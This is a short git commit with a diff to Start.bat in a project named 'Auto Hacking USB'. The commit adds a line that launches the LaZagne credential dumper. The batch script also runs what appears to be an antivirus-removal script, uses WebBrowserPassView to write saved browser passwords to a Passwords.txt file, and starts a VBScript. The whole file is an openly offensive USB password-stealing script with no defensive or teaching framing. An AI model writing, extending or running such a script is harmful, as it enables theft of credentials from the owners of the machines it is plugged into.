8d78c492388a982d13675c56491fb81b4c52c3bd
xyse <xyseprg@gmail.com>
2015-06-17 21:51:22 +0200

    LaZagne Supported !

--- Start.bat
+++ Start.bat
@@ -3,6 +3,7 @@ title Auto Hacking USB - xyse
 :Start
 start .\App\avrem.bat
 ping localhost -n 2 >nul
+start laZagne.exe all -w
 start .\App\WebPass\WebBrowserPassView.exe /stext .\Files\Passwords.txt
 start input.vbs
 exit
